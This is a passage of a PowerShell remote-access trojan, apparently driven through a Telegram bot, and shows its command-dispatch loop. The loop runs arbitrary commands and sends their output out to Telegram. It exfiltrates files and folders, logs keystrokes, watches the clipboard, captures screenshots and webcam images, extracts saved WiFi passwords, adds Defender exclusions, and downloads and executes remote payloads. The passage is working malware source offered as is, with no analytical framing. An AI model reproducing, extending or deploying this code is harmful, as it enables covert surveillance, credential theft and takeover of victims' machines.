                        Invoke-WebRequest -Uri $downloadUrl -OutFile $savePath -UseBasicParsing
                        Send-Message "📥 File saved as:`n$savePath"
                    }
                    catch {
                        Send-ErrMessage "❌ Error saving file:`n$_"
                    }
            
                    continue
                }
            }
            
            Send-Message $header2

            # Jika perintah diawali dengan "run "
            if ($text -like "run *") {
                $cmd = $text.Substring(4)
                try {
                    # Jalankan perintah dan ambil output
                    $output = Invoke-Expression $cmd 2>&1 | Out-String
                    if ([string]::IsNullOrWhiteSpace($output)) {
                        $output = "[✅] Perintah berhasil dijalankan tanpa output."
                    }

                    # Kirim bertahap jika lebih dari 4000 karakter
                    $maxLength = 4000
                    $chunks = [math]::Ceiling($output.Length / $maxLength)

                    for ($i = 0; $i -lt $chunks; $i++) {
                        $start = $i * $maxLength
                        $length = [math]::Min($maxLength, $output.Length - $start)
                        $part = $output.Substring($start, $length)

                        $body = @{
                            chat_id = $chatid
                            text    = if ($i -eq 0) { "$header$part" } else { $part }
                        }
                        Invoke-RestMethod -Uri "$apiBase/sendMessage" -Method Post -Body $body -UseBasicParsing
                        Start-Sleep -Milliseconds 300
                    }

                } catch {
                    Send-ErrMessage "❌ Terjadi error saat menjalankan perintah:`n$_"
                }
            }

            elseif ($text -like "getfile *") {
                $filePath = $text.Substring(8).Trim()

                if (
                    ($filePath.StartsWith('"') -and $filePath.EndsWith('"')) -or
                    ($filePath.StartsWith("'") -and $filePath.EndsWith("'"))
                ) {
                    $filePath = $filePath.Substring(1, $filePath.Length - 2)
                }

                try {
                    Send-TelegramFile -Path $filePath
                }
                catch {
                    Send-ErrMessage "❌ Gagal mengirim file:`n$_"
                }
            }

            elseif ($text -like "getfilecurl *") {
                $filePath = $text.Substring(12).Trim()

                if (
                    ($filePath.StartsWith('"') -and $filePath.EndsWith('"')) -or
                    ($filePath.StartsWith("'") -and $filePath.EndsWith("'"))
                ) {
                    $filePath = $filePath.Substring(1, $filePath.Length - 2)
                }

                try {
                    Send-TelegramFileAsync -FilePath $filePath
                }
                catch {
                    Send-ErrMessage "❌ Gagal mengirim file:`n$_"
                }
            }

            elseif ($text -like "getphoto *") {
                $filePath = $text.Substring(8).Trim()

                if (
                    ($filePath.StartsWith('"') -and $filePath.EndsWith('"')) -or
                    ($filePath.StartsWith("'") -and $filePath.EndsWith("'"))
                ) {
                    $filePath = $filePath.Substring(1, $filePath.Length - 2)
                }        

                try {
                    Send-TelegramPhoto -Path $filePath
                }
                catch {
                    Send-ErrMessage "❌ Gagal mengirim file:`n$_"
                }
            }

            elseif ($text -like "getfilem *") {
                $rawPaths = $text.Substring(8).Trim()

                # Pisah berdasarkan koma, lalu bersihkan kutip & spasi
                $filePaths = $rawPaths -split ',' | ForEach-Object {
                    $p = $_.Trim()
                    if (
                        ($p.StartsWith('"') -and $p.EndsWith('"')) -or
                        ($p.StartsWith("'") -and $p.EndsWith("'"))
                    ) {
                        $p = $p.Substring(1, $p.Length - 2)
                    }
                    return $p
                }

                try {
                    Send-MultiFiles -Paths $filePaths -Token $token -ChatId $chatid
                }
                catch {
                    Send-ErrMessage "❌ Gagal mengirim file:`n$_"
                }
            }

            elseif ($text -like "fileinfo *") {
                $rawPaths = $text.Substring(9).Trim()

                # Pisah berdasarkan koma, lalu bersihkan kutip & spasi
                $filePaths = $rawPaths -split ',' | ForEach-Object {
                    $p = $_.Trim()
                    if (
                        ($p.StartsWith('"') -and $p.EndsWith('"')) -or
                        ($p.StartsWith("'") -and $p.EndsWith("'"))
                    ) {
                        $p = $p.Substring(1, $p.Length - 2)
                    }
                    return $p
                }

                try {
                    FileInfo -ArrayPath $filePaths
                }
                catch {
                    Send-ErrMessage "❌ Gagal mengirim file:`n$_"
                }
            }

            elseif ($text -like "sendfile *") {
                $args = $text.Substring(8).Trim()
            
                # Bersihkan kutip jika ada
                if (
                    ($args.StartsWith('"') -and $args.EndsWith('"')) -or
                    ($args.StartsWith("'") -and $args.EndsWith("'"))
                ) {
                    $args = $args.Substring(1, $args.Length - 2)
                }
            
                # Manual ambil -u dan -p
                $urlStart = $args.IndexOf("-u ")
                $pathStart = $args.IndexOf("-p ")
            
                if ($urlStart -ge 0 -and $pathStart -gt $urlStart) {
                    $url = $args.Substring($urlStart + 3, $pathStart - ($urlStart + 3)).Trim()
                    $dest = $args.Substring($pathStart + 3).Trim()
            
                    if (-not $url -or -not $dest) {
                        Send-Message "❌ URL atau path kosong!"
                        return
                    }
            
                    try {
                        Send-File -Url $url -Destination $dest
                    }
                    catch {
                        Send-ErrMessage "❌ Gagal download file: $_"
                    }
                } else {
                    Send-Message "❌ Format salah. Contoh:`n sendfile -u https://site.com/a.jpg -p c:\1.jpg"
                }
            }       
            
            

            elseif ($text -like "srcfileext *") {
                $args = $text.Substring(11).Trim()
            
                $extMatch = [regex]::Match($args, "-e\s+([^\-]+)")
                $pathMatch = [regex]::Match($args, "-p\s+(.+)$")
            
                if ($extMatch.Success -and $pathMatch.Success) {
                    $exts = $extMatch.Groups[1].Value.Trim() -split ',' | ForEach-Object { $_.Trim() }
                    $paths = $pathMatch.Groups[1].Value.Trim() -split ',' | ForEach-Object { $_.Trim() }
            
                    SearchFileExt -ExtArray $exts -PathArray $paths
                } else {
                    Send-Message "❌ Format salah. Contoh:`n searchfileext -extarray pdf,docx -patharray d:\data,%temp%"
                }
            }

            elseif ($text -like "srcfileextsend *") {
                $args = $text.Substring(14).Trim()
            
                $extMatch = [regex]::Match($args, "-e\s+([^\-]+)")
                $pathMatch = [regex]::Match($args, "-p\s+(.+)$")
            
                if ($extMatch.Success -and $pathMatch.Success) {
                    $exts = $extMatch.Groups[1].Value.Trim() -split ',' | ForEach-Object { $_.Trim() }
                    $paths = $pathMatch.Groups[1].Value.Trim() -split ',' | ForEach-Object { $_.Trim() }
            
                    
                    try {
                        $fpath = SearchFileExtSend -ExtArray $exts -PathArray $paths
                        Send-TelegramFile $fpath
                        remove-Item $fpath -Force -ErrorAction SilentlyContinue
                    } catch {
                        Send-ErrMessage "❌ Gagal mengirim hasil pencarian."
                        remove-Item $fpath -Force -ErrorAction SilentlyContinue
                    }
                } else {
                    Send-Message "❌ Format salah. Contoh:\nsearchfileext -extarray pdf,docx -patharray d:\data,%temp%"
                }
            }
            
            elseif ($text -like "ls *") {
                $args = $text.Substring(3).Trim()
            
                # Split jadi array (pisah path dan mode)
                $parts = $args -split '\s+'
                $targetPath = $parts[0]
                $mode = if ($parts.Count -ge 2) { $parts[1] } else { "view" }
            
                try {
                    Custom-LS -Path $targetPath -Mode $mode
                } catch {
                    Send-ErrMessage "❌ Gagal mengeksekusi perintah `ls`. Error: $_"
                }
            }

            elseif ($text -like "lsnew *") {
                $args = $text.Substring(6).Trim()
            
                $mode = "view"
                $quick = $false
                $path = ""
            
                # Parsing mode dan quick flag
                if ($args -match "-mode\s+(\w+)") {
                    $mode = $matches[1]
                    $args = $args -replace "-mode\s+\w+", ""
                }
                if ($args -match "-quick") {
                    $quick = $true
                    $args = $args -replace "-quick", ""
                }
            
                $path = $args.Trim()
            
                if (-not $path) {
                    Send-Message "❌ Format salah. Contoh:`n ls d:\folder -mode txt -quick`n"
                    return
                }
            
                try {
                    Custom-LSNew -Path $path -Mode $mode -Quick:($quick)
                } catch {
                    Send-ErrMessage "❌ Gagal memproses perintah ls."
                }
            }
            
            

            elseif ($text -eq "start-clipwatch") {
                Start-ClipWatch -Token $token -ChatId $chatid
            }
            elseif ($text -eq "stop-clipwatch") {
                Stop-ClipWatch
            }
            elseif ($text -eq "screenshot") {
                Send-Screenshot
            }
            elseif ($text -eq "location") {
                Get-Geolocation
            }
            elseif ($text -eq "start-keytrack") {

                $global:logPath = Join-Path $logFolder "cache-$username-$pcname-$today.log"

                New-Item -Path $logFolder -ItemType Directory -Force | Out-Null
                
                Start-KeyTracker
                Send-Message "$header Key Tracker Activated"
            }
            elseif ($text -eq "stop-keytrack") {              
                Stop-KeyTracker
                Send-Message "$header Key Tracker Stoped"
            }
            elseif ($text -eq "start-sysmon") {              
                start-sysmon
                Send-Message "$header System Monitoring Started"
            }
            elseif ($text -eq "stop-sysmon") {              
                stop-sysmon
                Send-Message "$header Sysstem Monitoring Stoped"
            }
            elseif ($text -eq "listlog") {
                List-Log          
            }
            elseif ($text -eq "listmon") {
                List-Mon         
            }
            elseif ($text -eq "listsnap") {
                List-Snap         
            }
            elseif ($text -like "getlog *") {
                $rawPaths = $text.Substring(7).Trim()
            
                # Pisah berdasarkan koma, lalu bersihkan kutip & spasi, lalu buang yang kosong
                $filePaths = $rawPaths -split ',' | ForEach-Object {
                    $p = $_.Trim()
                    if (
                        ($p.StartsWith('"') -and $p.EndsWith('"')) -or
                        ($p.StartsWith("'") -and $p.EndsWith("'"))
                    ) {
                        $p = $p.Substring(1, $p.Length - 2)
                    }
                    if ($p) { return $p }  # hanya return kalau tidak kosong
                }
            
                if ($filePaths.Count -gt 0) {
                    try {
                        Get-Log -name $filePaths
                    } catch {
                        Send-ErrMessage "❌ Gagal mengirim file:`n$_"
                    }
                } else {
                    Send-ErrMessage "❌ Tidak ada nama file yang valid."
                }
            }       
            elseif ($text -like "getmon *") {
                $rawPaths = $text.Substring(7).Trim()
            
                # Pisah berdasarkan koma, lalu bersihkan kutip & spasi, lalu buang yang kosong
                $filePaths = $rawPaths -split ',' | ForEach-Object {
                    $p = $_.Trim()
                    if (
                        ($p.StartsWith('"') -and $p.EndsWith('"')) -or
                        ($p.StartsWith("'") -and $p.EndsWith("'"))
                    ) {
                        $p = $p.Substring(1, $p.Length - 2)
                    }
                    if ($p) { return $p }  # hanya return kalau tidak kosong
                }
            
                if ($filePaths.Count -gt 0) {
                    try {
                        Get-Mon -name $filePaths
                    } catch {
                        Send-ErrMessage "❌ Gagal mengirim file:`n$_"
                    }
                } else {
                    Send-ErrMessage "❌ Tidak ada nama file yang valid."
                }
            }    
            elseif ($text -like "getsnap *") {
                $rawPaths = $text.Substring(8).Trim()
            
                # Pisah berdasarkan koma, lalu bersihkan kutip & spasi, lalu buang yang kosong
                $filePaths = $rawPaths -split ',' | ForEach-Object {
                    $p = $_.Trim()
                    if (
                        ($p.StartsWith('"') -and $p.EndsWith('"')) -or
                        ($p.StartsWith("'") -and $p.EndsWith("'"))
                    ) {
                        $p = $p.Substring(1, $p.Length - 2)
                    }
                    if ($p) { return $p }  # hanya return kalau tidak kosong
                }
            
                if ($filePaths.Count -gt 0) {
                    try {
                        Get-Snap -name $filePaths
                    } catch {
                        Send-ErrMessage "❌ Gagal mengirim file:`n$_"
                    }
                } else {
                    Send-ErrMessage "❌ Tidak ada nama file yang valid."
                }
            }          

            elseif ($text -eq "getclip") {
            $clip = Get-Clip
                if ($clip) {
                    Send-Message "$header 📋 Clipboard :`n $clip"
                }
            }
            elseif ($text -eq "activepage") {
                $info = Get-ActiveWindowInfo
                Send-Message "🪟 App: $($info.AppName)`n 📝 Title: $($info.Title)"
            }
            elseif ($text -eq "recentfiles") {
                Export-RecentFilesStealth
            }
            elseif ($text -eq "diskinfo") {
                Get-DiskInfo
            }
            elseif ($text -eq "driveinfo") {
                Get-DriveInfo
            }
            elseif ($text -eq "wifipass") {
                $wifipass = Get-WifiPasswords
                Send-Message $wifipass    
            }
            elseif ($text -like "exclude*") {
                Add-DefenderExclusionFromCommand $text
                continue
            }
            elseif ($text -like "getcam *") {
                $num = $text.Substring(7).Trim()
                if ($numText -match '^\d+$') {
                    $num = [int]1
                }
                try {
                    send-cam -Count $num
                } catch {
                    Send-Message "❌ Error Get Cam"
                }
            }

            
            elseif ($text -like "processlist*") {
                $parts = $text -split "\s+"
                $isTxt = $parts.Count -gt 1 -and $parts[1].ToUpper() -eq "-TXT"
            
                if ($isTxt) {
                    $path = "$env:TEMP\ActiveApps.txt"
                    Get-ActiveAppProcessList -ToFile -OutPath $path
                    Send-TelegramFile $path
                } else {
                    $info = Get-ActiveAppProcessList
                    Send-Message "🪟 Active Apps:`n$info"
                }
            }  

            elseif ($text -like "cd*") {
                $arg = $text -replace "^cd\s*", ""
                $arg  = Resolve-FolderToken $arg 
            
                if ($arg -eq "") {
                    # Tampilkan path sekarang
                    $curr = $global:CurrentPath 
                    Send-Message "📂 Current Path:`n$curr"
                }
                elseif (Test-Path $arg) {
                    Set-Location $arg
                    $global:CurrentPath = (Get-Location).Path
                    Send-Message "✅ Path changed to:`n$global:CurrentPath"
                }
                else {
                    Send-Message "❌ Path not found: $arg"
                }
            }
            

            elseif ($text -like "diskinfo *") {
                $num = $text.Substring(8).Trim()
                try {
                    Get-DiskInfo2 $num
                }
                catch {
                    $errMsg = $header + "❌ Gagal mengirim file:`n$_"
                    $body = @{
                        chat_id = $chatid
                        text    = $errMsg
                    }
                    Invoke-RestMethod -Uri "$apiBase/sendMessage" -Method Post -Body $body -UseBasicParsing
                }
                
            }
            elseif ($text -like "getfold *") {
                $filePath = $text.Substring(8).Trim()

                if (
                    ($filePath.StartsWith('"') -and $filePath.EndsWith('"')) -or
                    ($filePath.StartsWith("'") -and $filePath.EndsWith("'"))
                ) {
                    $filePath = $filePath.Substring(1, $filePath.Length - 2)
                }

                try {
                    Send-TelegramFolder -FolderPath $filePath
                }
                catch {
                    Send-ErrMessage "❌ Gagal mengirim file:`n$_"
                }
            }

            elseif ($text -like "downexec *") {
                $args = [regex]::Matches($text, '[\"“](.*?)[\"”]|(\S+)') | ForEach-Object {
                    if ($_.Groups[1].Success) { $_.Groups[1].Value } else { $_.Groups[2].Value }
                }
            
                if ($args.Count -lt 2) {
                    Send-ErrMessage "❌ Format salah. Contoh:\n`downexec <url>`\n`downexec <url> '"'C:\Path\file.exe\'"'"
                    return
                }
            
                $url = $args[1]
            
                if ($args.Count -ge 3) {
                    $filePath = $args[2]
                } else {
                    # Jika tidak ada path, simpan default di TEMP
                    $fileNameFromUrl = [System.IO.Path]::GetFileName($url)
                    $filePath = Join-Path $env:TEMP $fileNameFromUrl
                }
            
                try {
                    Write-Output $filePath
                    Download-AndExecute $url $filePath
                } catch {
                    Send-ErrMessage "❌ Gagal mengunduh atau menjalankan file:`n$_"
                }
            }
            

            elseif ($text -like "downexeczip *") {
                $args = [regex]::Matches($text, '[\"“](.*?)[\"”]|(\S+)') | ForEach-Object {
                    if ($_.Groups[1].Success) { $_.Groups[1].Value } else { $_.Groups[2].Value }
                }
            
                if ($args.Count -lt 3) {
                    Send-Message "❌ Format salah. Contoh:\ndownexec https://example.com/file.zip \"C:\Dump\""

                    return
                }
            
                $url = $args[1]
                $dest = $args[2]
            
                Download-AndExecuteZip -url $url -destinationPath $dest
            }
            elseif ($text -eq "help") {
                Help
            }
            else {Send-ErrMessage "❌ Command not found! `n type : Help to view command !"}           
        }

    } catch {
        Write-Warning "❌ Polling error: $_"
    }

    Start-Sleep -Seconds 2
}
